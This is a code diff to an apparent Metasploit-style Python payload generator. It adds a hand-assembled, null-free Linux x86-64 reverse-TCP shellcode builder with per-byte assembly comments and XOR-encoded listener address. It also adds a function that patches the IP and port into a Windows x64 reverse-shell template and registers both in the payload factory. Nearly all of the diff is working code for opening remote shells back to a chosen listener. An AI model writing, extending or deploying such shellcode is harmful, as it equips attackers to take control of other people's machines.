@@ -7,6 +7,11 @@ Metasploit's ``generate`` workflow.
 
 Payloads are registered as ``PayloadTemplate`` instances with metadata
 (name, platform, arch, description, options) and a ``generate()`` method.
+
+Dynamic shellcode patching is supported for reverse-TCP payloads: the
+``ShellcodePayload`` class replaces known IP / port placeholders inside
+embedded templates at generation time, removing the need for msfvenom on
+the most common combos.
 """
 
 from __future__ import annotations
@@ -14,6 +19,8 @@ from __future__ import annotations
 import base64
 import builtins
 import os
+import socket as _socket
+import struct as _struct
 import subprocess
 from abc import ABC, abstractmethod
 from typing import Any
@@ -103,6 +110,103 @@ SHELLCODE_TEMPLATES: dict[str, str] = {
         "\\x00\\x53\\xff\\xd5"
     ),
 }
+
+IP_PLACEHOLDER_X64 = bytes(range(1, 9))
+PORT_PLACEHOLDER_X64 = b"\x42\x42\x42\x42"
+
+
+def _build_linux_x64_reverse_tcp(lhost: str, lport: int) -> bytes:
+    """Generate a fresh, null-free Linux x86-64 reverse-TCP shellcode.
+
+    Uses the socket-connect-dup2-execve syscall sequence.  IP and port
+    are XOR-encoded at generation time so the blob contains no ``\\x00``
+    bytes regardless of the chosen listener address.
+
+    Args:
+        lhost: IPv4 address for the listener.
+        lport: TCP port for the listener (1--65535).
+
+    Returns:
+        Raw null-free position-independent shellcode bytes (~110 bytes).
+    """
+    ip_be = _socket.inet_aton(lhost)
+    port_be = _struct.pack(">H", lport)
+
+    xor_key = 0x37
+    for candidate in range(1, 256):
+        if all((b ^ candidate) != 0 for b in ip_be) and all((pb ^ candidate) != 0 for pb in port_be):
+            xor_key = candidate
+            break
+
+    ip_xor = bytes(b ^ xor_key for b in ip_be)
+    port_xor = bytes(b ^ xor_key for b in port_be)
+    key_dword = _struct.pack("<I", xor_key | (xor_key << 8) | (xor_key << 16) | (xor_key << 24))
+    key_word = _struct.pack("<H", xor_key | (xor_key << 8))
+
+    return (
+        b"\x48\x31\xd2"                            # xor rdx, rdx
+        b"\x52"                                      # push rdx (null terminator)
+        b"\x48\xb8/bin//sh"                          # movabs rax, "/bin//sh"
+        b"\x50"                                      # push rax
+        b"\x48\x89\xe7"                              # mov rdi, rsp -> *"/bin//sh"
+        b"\x6a\x02\x5e"                              # push 2; pop rsi
+        b"\x6a\x29\x58"                              # push 41; pop rax (SYS_socket)
+        b"\x6a\x02\x5f"                              # push 2; pop rdi (AF_INET)
+        b"\x99"                                      # cdq -> rdx=0
+        b"\x0f\x05"                                  # syscall
+        b"\x48\x97"                                  # xchg rdi, rax
+        b"\x52"                                      # push rdx (8 bytes zero padding)
+        b"\x52"                                      # push rdx (8 bytes zero padding)
+        b"\xb8" + ip_xor +                            # mov eax, ip_xor
+        b"\x35" + key_dword +                         # xor eax, key_dword
+        b"\x89\x44\x24\x04"                           # mov [rsp+4], eax
+        b"\x66\xb8" + port_xor +                      # mov ax, port_xor
+        b"\x66\x35" + key_word +                      # xor ax, key_word
+        b"\x66\x89\x44\x24\x02"                       # mov [rsp+2], ax
+        b"\x31\xc9"                                   # xor ecx, ecx
+        b"\xff\xc1"                                   # inc ecx (ecx=1)
+        b"\xff\xc1"                                   # inc ecx (ecx=2 -> AF_INET)
+        b"\x66\x89\x0c\x24"                           # mov [rsp], cx
+        b"\x48\x89\xe6"                              # mov rsi, rsp -> &sockaddr
+        b"\x6a\x10\x5a"                              # push 16; pop rdx (addrlen)
+        b"\x6a\x2a\x58"                              # push 42; pop rax (SYS_connect)
+        b"\x0f\x05"                                  # syscall
+        b"\x6a\x02\x5e"                              # push 2; pop rsi
+        b"\x6a\x21\x58"                              # dup_loop: push 33; pop rax
+        b"\x0f\x05"                                  # syscall (dup2)
+        b"\x48\xff\xce"                              # dec rsi
+        b"\x79\xf7"                                  # jns dup_loop
+        b"\x6a\x3b\x58"                              # push 59; pop rax (SYS_execve)
+        b"\x48\x31\xf6"                              # xor rsi, rsi
+        b"\x99"                                      # cdq
+        b"\x0f\x05"                                  # syscall
+    )
+
+
+def _patch_shellcode_x64(raw: bytes, lhost: str, lport: int) -> bytes:
+    """Replace IP and port placeholders inside a Windows x64 reverse-TCP
+    shellcode template.
+
+    The x64 template carries an 8-byte sequential placeholder
+    ``\\x01..\\x08`` inside a ``mov rdx, imm64`` that encodes the
+    ``sockaddr_in`` structure, and a 4-byte ``\\x42\\x42\\x42\\x42``
+    marker for the port check that follows.
+
+    Args:
+        raw: The raw shellcode bytes (from ``_parse_escaped_hex``).
+        lhost: IPv4 address to replace the placeholder with.
+        lport: TCP port.
+
+    Returns:
+        Patched shellcode bytes.
+    """
+    addr = _socket.inet_aton(lhost)
+    family = _struct.pack("<H", _socket.AF_INET)
+    port_be = _struct.pack(">H", lport)
+    sockaddr = family + port_be + addr
+    result = raw.replace(IP_PLACEHOLDER_X64, sockaddr)
+    result = result.replace(PORT_PLACEHOLDER_X64, port_be + port_be)
+    return result
 
 
 class PayloadTemplate(ABC):
@@ -249,9 +353,25 @@ class MsfvenomPayload(PayloadTemplate):
 
 
 class ShellcodePayload(PayloadTemplate):
-    """Generate raw shellcode bytes from an embedded template."""
+    """Generate raw shellcode bytes from an embedded template.
 
-    def __init__(self, name: str, platform: str, arch: str, description: str, escaped_hex: str) -> None:
+    When ``lhost`` and ``lport`` are both provided, the shellcode is
+    dynamically patched: known IP / port placeholder byte sequences inside
+    the template are replaced with the caller's values so the resulting
+    blob connects back to the correct listener.
+    """
+
+    _PATCHERS: dict[str, Any] = {}
+
+    def __init__(
+        self,
+        name: str,
+        platform: str,
+        arch: str,
+        description: str,
+        escaped_hex: str,
+        patcher: Any | None = None,
+    ) -> None:
         super().__init__(
             name=name,
             platform=platform,
@@ -263,9 +383,52 @@ class ShellcodePayload(PayloadTemplate):
             },
         )
         self._raw = _parse_escaped_hex(escaped_hex)
+        if patcher is not None:
+            ShellcodePayload._PATCHERS[name] = patcher
 
     def generate(self, **kwargs: Any) -> bytes:
-        return self._raw
+        """Return the shellcode, optionally patching LHOST / LPORT."""
+        raw = self._raw
+        lhost = kwargs.get("lhost")
+        lport = kwargs.get("lport")
+        if lhost and lport:
+            patcher = ShellcodePayload._PATCHERS.get(self.name)
+            if patcher is not None:
+                return patcher(raw, lhost, int(lport))
+        return raw
+
+
+class DynamicShellcodePayload(PayloadTemplate):
+    """Generate shellcode entirely at runtime — no static template needed.
+
+    The ``builder`` callable receives ``(lhost, lport)`` and must return
+    the complete position-independent shellcode as ``bytes``.
+    """
+
+    def __init__(
+        self,
+        name: str,
+        platform: str,
+        arch: str,
+        description: str,
+        builder: Any,
+    ) -> None:
+        super().__init__(
+            name=name,
+            platform=platform,
+            arch=arch,
+            description=description,
+            options={
+                "lhost": {"type": "address", "required": True, "description": "Listener IP"},
+                "lport": {"type": "integer", "required": True, "description": "Listener port"},
+            },
+        )
+        self._builder = builder
+
+    def generate(self, **kwargs: Any) -> bytes:
+        lhost = kwargs.get("lhost", "127.0.0.1")
+        lport = int(kwargs.get("lport", 4444))
+        return self._builder(lhost, lport)
 
 
 def _parse_escaped_hex(escaped: str) -> bytes:
@@ -316,8 +479,9 @@ class PayloadFactory:
                 name="windows/x64/shellcode_exec",
                 platform="windows",
                 arch="x64",
-                description="Native Windows x86-64 reverse shell shellcode",
+                description="Native Windows x86-64 reverse shell shellcode (supports IP/port patching)",
                 escaped_hex=SHELLCODE_TEMPLATES["windows/x64/exec"],
+                patcher=_patch_shellcode_x64,
             ),
             ShellcodePayload(
                 name="windows/x86/shellcode_exec",
@@ -325,6 +489,13 @@ class PayloadFactory:
                 arch="x86",
                 description="Native Windows x86 reverse shell shellcode",
                 escaped_hex=SHELLCODE_TEMPLATES["windows/x86/exec"],
+            ),
+            DynamicShellcodePayload(
+                name="linux/x64/shellcode_reverse_tcp",
+                platform="linux",
+                arch="x64",
+                description="Dynamic Linux x86-64 reverse TCP shellcode (no msfvenom, no template, built at runtime)",
+                builder=_build_linux_x64_reverse_tcp,
             ),
         ]
         for t in builtins:
@@ -537,11 +708,16 @@ __all__ = [
     "PayloadFactory",
     "PayloadTemplate",
     "ShellcodePayload",
+    "DynamicShellcodePayload",
     "ReverseShellPayload",
     "WindowsReverseShellPayload",
     "MsfvenomPayload",
     "SHELLCODE_TEMPLATES",
     "OUTPUT_FORMATS",
+    "IP_PLACEHOLDER_X64",
+    "PORT_PLACEHOLDER_X64",
     "format_payload_table",
     "_parse_escaped_hex",
+    "_build_linux_x64_reverse_tcp",
+    "_patch_shellcode_x64",
 ]
